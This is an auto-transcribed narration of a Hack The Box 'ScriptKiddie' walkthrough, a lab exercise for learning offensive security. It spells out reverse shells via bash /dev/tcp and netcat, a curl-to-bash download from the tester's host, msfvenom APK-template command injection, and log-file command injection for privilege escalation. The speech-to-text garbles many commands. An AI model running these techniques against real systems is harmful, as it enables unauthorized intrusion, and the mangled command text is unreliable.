 what's going on youtube this is ipsec i'm doing script kitty from hack the box which was a fun easy box that took the theme of attacking a script kitty who set up a web server to do basic things like run nmap msf venom and search boy there is a vulnerability in the version of msf venom he is running that enables code execution so you can get a shell on his box he is a pretty good script kitty since he didn't run the web server as root but he did set up some automation to automatically scan people who attack his web server and within that automation you can exploit it to get um access to another user that can run metasploit with sudo and once you get metasploit running as root you can just execute any binary on the system so run metasploit type bash and you're on as root with that being said let's jump in as always we're going to start over the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and then we can call it script kitty and then the ip address of 10 10 10 2 2 6 and actually i'm going to add the dash v flag so it shows me open ports as it finds them and we have port 22 and 5000 so far so let's just go over to firefox and go to 101010226 and with specify port 5000 and i'm also going to get rid of that http and just do plain text so we do have a web page the very first thing i like doing is going over into my firefox developer tools of course i could go into burp suite to do this but your findings always have a bit more impact when you can show that no special tools are involved sometimes just the fact of showing burp suite someone's like oh you use a special tool uh people won't do that and it's not really valid but i always like just showing in firefox you can just view this by hitting f12 and then we can see the server of this is work zug python385 so based upon this being python i know i don't want to do any type of php payloads or things like that so let's go back over to nmap it has finished we can look at the results so cat and map script kitty and map and i'm going to pipe this over into x-clip and then we can just paste the results and we can look at it we do have ssh on port 22 and the banner tells us it's an ubuntu server and then http on port 5000 and its banner tells us the same thing we had saw before it's a work zug http python application so python the web server doesn't end in like dot pi or anything it just ends in file names so if i do a go buster i just want to do a basic one so we'll do go buster mode is der h it's actually been a while since i've ran this i think dash w for wordless so opt set list discovery web content and then we want raft small words dot text and if this was a windows box i do dash lower case because windows file names aren't case sensitive and then dash o for out file we'll just call this go busto dash root dot log and then dash u for url i think there we go that looks like it is working so the next thing we have is just this website we have three things we can do first and map the top 100 ports of an ip so i'm going to give it itself to see if there's any like ports that this shows is open that mine doesn't and we can see just ssh and 5000 is running so the first thing i want to do is um i guess we can try showing this in um firefox instead of going to burp suite let's do 127.001 and hit scan and we can see this sends a post request and let's see where is the data post that's response headers oh request we're in headers so it sends ip and action scan so if on this i do curl dash x to turn it in post dash d for data ip is equal to 127.00 and i think action scan action equals scan and then 10 10 10 and it's 226. 5000 let's see if this does what we think it will so we get a whole web page back and i'm hoping this shows yes scan results for this so we have successfully done this in curl nothing special here but the one thing i like doing when testing boxes is just doing a bunch of w fuzzes so actually instead of w fuzz what is that other one um fuff that's what i want to use and the main reason i'm just using this one is because the hack the box academy has a good course on it so if you want to do any advanced things in fluff it's much easier to get material so i'm going to do f u for url http 101010226 dash d we can say ip is equal to 127.001 fuzz and action is equal to scan dash w opt set list fuzzing special characters.txt and i think that's all we want to do how do i do proxy replay proxy x so i'm going to send this to burp suite so we can see the request just to make sure it looks fine so we're going to say dash x http 12701 colon 8080 and in burp suite i'm going to go to my proxy intercept is on and we're going to send this and we can look at exactly what this looks like so i think it is fine i'm going to go to repeater tab and send this and we failed to connect to port 80. so i forgot one thing we had to specify port 5000 so it didn't look fine and that's why i always like sending it to burp suite to just double check what it looks like to make sure i did it correctly so now we can send this and we send one thing and i don't know exactly what it says i don't see any type of nmap results if i get rid of that carrot we should see it's scanning localhost we don't actually let's see i p action equals scan what was a curl command dash x post that is a post ip action scan if i send this we get 22 tcp let's send 22 tcp um maybe it's blocking on user agent nope oh um content type this is the one thing i do not like about um fuff is it doesn't put this content type header so a lot of times you'll miss something uh what is the content type we want to use i'm just going to um intercept something from my web browser instead of looking up the argument to use a proxy and curl i'm just going to send it through burp suite and we can look and this is what i mean about always validating your results before you run some type of automated scan to make sure you have it correct so if we add this content type header to this let's see what we get and we do have something so we need to add this so let's go into fluff dash h and i'm going to look at head capital h name colon value okay so i'm still going to leave this on my burp suite proxy dash h like that let's turn proxy off to clear this and run it and i do have that content type header so i think this time if i go into uh burp suite i to get invalid ip which is fine all i want to do is scan a bunch of um invalid characters to see how they behave so that's good i'm going to get rid of brip sweep because if i leave it going through a proxy it's going to go slow and i'm going to the dash f w to filter words and let's hide everything with 115 because 115 doesn't look too interesting and we can see an and gives us 161. so in burp suite i'm going to put that and here oh that and probably just does a valid yeah so that's what happened there and that's because this is a valid post request um it didn't put this and as part of the ip it just separate it because and is how you separate parameters we can url encode that so it doesn't go with the separating parameters and we just get invalid ip so it looks like if we just put any type of special character in here we get invalid ip which doesn't help us so i'm going to go to the next parameter and this is generally how i um search for things and ip didn't work we could do this one payloads but this has two options this is going to be a bit harder to test the search boy looks easy so let's just go again let's do it through burp suite instead of a browser since we've demonstrated it one way demonstrate it two ways so i'm going to do search point and see what happens actually search is test and action is search point so let's go over to repeater tab send it and test let's see looks like it is msf venom output or not msf um search plate output as the action would indicate and we can also do a fuzz against the action so if we go back to this w fuzz let's say 12701 and action is fuzz and we can let's hide size i guess so filter s for size and we see a lot of 36's i don't care about that and we have a few that behave oddly this and again i'm not going to put too much emphasis in this because if i url and care of that it's going to do something different but let's try putting a single quote there so what happens if we do action single quote um let's see instead of this let's go back to this one where ip is and we'll do scan with a single uh not single quote double quote and this just gets weird application json back i'm actually not sure what's going on there what if we put two special characters um let's do double pipe who am i see ping 10 10 14 2 and we'll do c1 for count one and then i'm going to put a comment after that like that and we'll do tcp dump dash i ton0 icmp and i'm also going to do dash n so we don't do dns and we run this and we don't get a ping this is just me pinging the gateway for this thing up here i wanted to see like 10 10 10 2 2 1 pinging me so i don't see that so i don't have code execution but that is weird i don't know exactly what's going on there so let's switch back to this and let's do search is equal to test with special characters and action search plate so going back to fuff um instead of ip we can say search is equal to um test fuzz action search plate and let's see we can i guess look at well plus and this are um special characters and urls so i'm guessing that's not really doing anything but we have this period that's interesting i'm just going to filter words for 121. so yeah let's look at what period does so test period and i think it just gets more data we could again look at test plus to see what this does and it looks like maybe it just returns more stuff inside of search point so i don't think there's anything here so the next thing we have on this website is this payloads thing which is going to be heard uh to use wfuzz that i should say it does msf venom it up and we can generate some payloads and we got windows linux android lhost and template file i don't know exactly what this is but the first thing i'm going to do is look at msf venom and we have um search plate running right here so we have to do it on a box let's just do it in the website i must have venom hit search point and did we crash the app i'm not sure why that's not working search point msf venom so we do have something here but i'm just going to hit this page msf venom search point okay and this shows it as well um we don't know what version of msf venom this is and we could also try like code execution here so 127.001 um who am i and click generate let's see what happens invalid lhost ip and we can try injecting where this os equals windows so 127 and i'm going to turn my proxy on clear my intercept queue click generate center repeater window and we can say windows who am i see what happens here template file option invalid os so it doesn't look like anything is directly exploitable through this because they do have filtering we could send this stuff through w fuzz but um i might as well just try this one cve out first so let's add the x flag to examine it and oh um we do um dash x against the path so this so looking at this let's try to get a date it is somewhere in the year 2020 so it's somewhat recent and it looks like it is going to put a payload inside of the common name of a certificate and at the end of this video i want to look at how this actually works because i don't understand this exploit right now so let's just do dash m and try it out like me me saying i don't understand how this exploit works is i don't understand why putting a payload inside of a ssl name would ever lead to code execution so the payload here and let's see echo code execution as id so we just put whatever we want here so i'm going to do bash dash i or yeah let's just do bash dash i dev tcp 10 10 14 2 9 000 one and one i think that's right and i'm going to change this from sh to bash so i always know this executes and bash because this dev tcp thing is a bash thing and some other shells it may not work so if bin sh is linked to not bash this reverse shell may not work so we have this shell i'm going to execute it let's hope it's python 3. looks like um no yeah that did not work let's see adding java incorrect ava format let's see do we have just weird special characters in this payload but it goes to base64. see i don't have any error message there what just happened there dash i devtcp 1010 14 thousand one zero and one key tool error invalid keyword i wonder if there's like a length i am so confused by this okay um let's see if we can't do this payload let's just go for a shell cheat sheet and find one we can and if this was like a php web server i just tried writing a php shell to the web server but can't do that so let's see maybe netcat's on the box this does appear to have metasploit so maybe we'll get lucky and have this dash e in netcat 10 10 14 2 9 9001 so this works and it says do msf venom x evil apk android localhost let's copy this apk here and go to this tool let's do android lhost 127.01 and specify the template file we just did so hdb script kitty evo.apk nclvmp 9001 generate do we get a callback if we don't i'm going to switch to like curling ourself to see if it works um it's taking its way time to respond to us i'm not going to give up on the shell until the page gives a response and we don't have one something went wrong so that obviously doesn't work let's just try curling maybe the netcat command failed maybe and netcat's not there so curl 10 10 14 2. we'll say port 8 000 run this exploit again apk file is here so let's copy it go to android 127.001 and hopefully this is it uh let's see v49 whatever port 8000 is what i did glad i checked that generate so let's see if we get a curl back to us we do okay so that is good let's make dirt dub dub dub and then v shell dot sh and we can say bash dash i dev tcp 1010 14 2 9001 0 at hand 1. okay so python 3 m http server and then we want to listen on netcat 9001 and let's edit this to curl rev.sh and pipe it over to bash so let's see python349 copy this apk i should just edit this to not use the temp because that's getting annoying and now let's specify the template back to us we did not specify android so we should see it hit our web server and it's going to hit shell.sh i call it rev.sh and be shown to h do this again uh we should just hit generate see 1 27 don't do who am i there we go so we should see it hit rev.s.h and then get a reverse shell on 9001 if everything goes to plan so we hit and we got a shell so yay uh python3 dash c import pty pty spawn bin bash stty raw minus echo fg enter enter you won't see the fg as you type but if all goes well you'll be able to have tab auto complete and control c so export term is equal to x term and that's going to give me the ability to clear the screen so now we're a shell on this box i'm going to do sudo l we need a password for kid so let's see cat app.pi uh there is no database here it seems uh grep ri password nothing we can go into kids home directory and we do have this logs if we cat hackers don't know exactly what that's doing we got user.txt go in html and we're going to graph dash r logs and we do have app.pi doing something with this file so let's look at this what is it doing logs and you see how my terminal is kind of like cut not the full thing let's fix that real quick and that's another stty command so in my regular pane i'm going to do stty dash a it's going to tell me i have 34 rows and 136 columns so we can do stty rose 34 carls 136 34 136 yes hit that oh let's see like that and now if i go back into this my vim is good on everything so that's good uh let's see logs so in search point it's going to append something and if we do something it's going to say stop hacking me will hack you back so let's see if regex alphanume is this so let's look at regex alpha and it's just making sure there's alphanumeric so if we put something that's not alphanumeric it should write to that log file so let's go to logs cat hackers so if we go to search blight and put some non-alphanumeric characters in it we should i've got something uh let's tail dash f on hackers and put something here search point and we get the ip address and then hackers file truncated that's odd so let's go in html again app.pi see what logs is doing it's saying he'll hack us back and he's putting the ip address there don't know exactly what's going on um i'm just gonna run peace by so if we do piece by github and download this tool this is going to show us all the processes that run on the box so let's go to releases let's download the small version so piece by 64 small and we can go over here just go into dub dub dub and copy downloads piece by 64 small here we go dev shm curl 10 10 14 2 8 000 piece by 64 small piece by 64 small so chmod plus x p spy and run it and then we also want to start up another web shell so nclvnp 9001 and i'm gonna go back here let's go to android lhost 127.001 apk generate and the reason why we just want to get a second web shell is because this one is tied up in this and we can kind of see how the code execution actually works so msfvenom is calling key tool it looks like to run things so this is just opening a process doing key tool and i'm guessing based upon the common name yep right here so that's interesting how the actual rce works in this so i bet if we go into the github repository look at key tool i mean look at msf venom and what it does with this template file this is just a like osp open command or whatever ruby's equivalent is because msf venom's in ruby and it's just passing a bunch of stuff into key tool and right here you can see we're exiting the cn putting a pipe and then echoing our reverse shell so we just got standard code execution based upon this so it's a pretty cool thing of um showing how you can find vulnerabilities by just doing dynamic analysis on things and looking at what it does because we could go through the ruby code and try to analyze it or if we just like trace the process as we're doing things and see it doing dangerous things you can potentially find something so if you're trying to look for like odas and applications on your own i would just kind of like run tools maybe l-trace or p-spy while the tool runs and see if it makes any calls to actual binaries and if it does take a look around that code so let's see we have this so what i want to do is put something here and we'll do search point and when we put special characters we can see the box actually doing an nmap against myself so it's calling home pwn scan losers.sh what is that file do we have access to it uh let's see home phone yeah we do so we can do um let's do the sdty trick i thought i did it but maybe not i did not so let's see hit fg real quick python3 dash c import pty pty spawn been bash because i like having auto complete raw minus echo okay we can just cat scan losers to see what it does so it's going to go into home pwn and then this log it's going to cut delimiter of space field 3 and read each as ip and run nmap against it so we should have just like that key tool that we just looked at a way to get code execution here so if we put something inside of home log and this dash and cut is going to do everything after so it's going to go to field 3 and then everything after it see do we have anything here if we go before this tool let's see if i search for truncated there we go so it's separating on delimiter space so we got space here this is one this is two this is three and everything after so if we put a reverse shell right here chances are it will execute it so let's see we probably will want to do semicolon to break this so we break out of this command and then we put a reverse shell and we're going to have to put a space and then something to break this so either like a comment or a um let's just go and bim and show you real quick uh vim test so what we can do is put this ip to do semicolon and then if we put the command here it's going to append.nmap so our command we want to do space and then either a semicolon or a comment so everything after this doesn't matter so let's go back into here we can go to kid and let's make a super simple payload so cd we want to go into logs and we should be able to write here because it's writing the logs anyways so nclvmp 9001 and i'm going to echo semicolon curl 10 10 14 2 9001 and we'll just put a comment so all we want to do is echo this into hackers and see if it makes a curl quest against us we could just put the reverse shell there instead of the curl but that introduces a lot of bad characters and we never know if it's the command injection syntax that's failing or the reverse shell syntax that's failing so it's always better i think to start with a simple thing so that way when it fails you know we just screwed up with the command injection so since we didn't get a curl here i'm going to go and cut the scan losers file again and see if we understand this correctly so it's home pwn scan something so i'm just going to cat stir and the thing i'm iffy about is this cut command so i just want to make sure it's going to take everything after the third separator so let's go v here edit temp a b c d f g h i j k l m n o uh one two three four five six seven eight nine so i just want to do this cut command real quick so cut dash d with this dash f3 dash on temp and we start at g h i j k l m n o so what i think happened um when i echoed into the file i assumed it was putting the date because that's what the web page did it was like um yeah whatever the webpage did 00714 uh 2021 time at 12 2 2 2 and then cmd and this is where we are writing however um when we cat into the file we gotta take account that we're not writing these two things so let's put two things before a curl command and see what happens so let's go back here and we can say um a b c d e f and space so now this dash three dash should pull from curl onwards so we do this and now we get that curl command so now we can put a reverse shell so let's do um we can just call rev.sh and pipe it over to bash and we get the shell oh wait um the rev.sh that is listening on uh port 8000 so let's do port 8000 rev sh and there we go now we're the pawn user so we didn't get the password for script kitty but we did get uh pwn so i'm going to do python 3 c import pty pty spawn bin bash and then sdty raw minus echo fgn adder and if we look at this recon directory it just has dollar.nmap i wonder if that's from us writing it but if we do studio-l we can see he can run metasploit with no password so i'm going to run metasploit and within metasploit it allows us to execute commands i'm not positive this is a gtfo bin it's just something i know if you do exclamation point who am i or xmage point space wait a second i was pretty sure we could have done that um maybe it's just magical we don't do an exclamation point yep that's it um i kept trying the exclamation point because that's how it works within my sequel but looks like in metasploit it just says well this isn't a metasploit command but it exists as a binary in the box let's execute it so if i just do bin sh we can get executed and we are now on the box as um root c slash root and then we can get root.text alternatively if that function didn't exist metasploit does give the ish the ability to drop into irb which is a interactive ruby shell and from here we could also execute um something so if we do ruby execute command let's see how to command maybe system system then bash like that there we go so that's how you could do it as well i think that's just interactive ruby what it stands for and that becomes super handy when troubleshooting metasploit plugins or if you want to script out some interpreter commands you can drop into a scripting console and do a bunch of cool things so that is the box pretty much um i want to look at the actual exploit so if we go to um as a msf venom cve let's see does this have a write up here's an advisory in brief the vulnerability uh let's see the command vulnerability step to the process key tool is being executed so yep i'm right based upon that [Music] piece by output we can see it doing the run cmd gen key and then this is how you do variables in um ruby so let's see it probably has stir cn like that or i thought that's how you do variables in ruby let's see where was it highlighting we can just go back to the page line 194 uh a ridge cert d name so if we look up here this is where it's actually grabbing the variable so i'm sure if i go to this it'll highlight what it's doing but yeah so that is the box hope you guys enjoyed it take care and i will see you all next week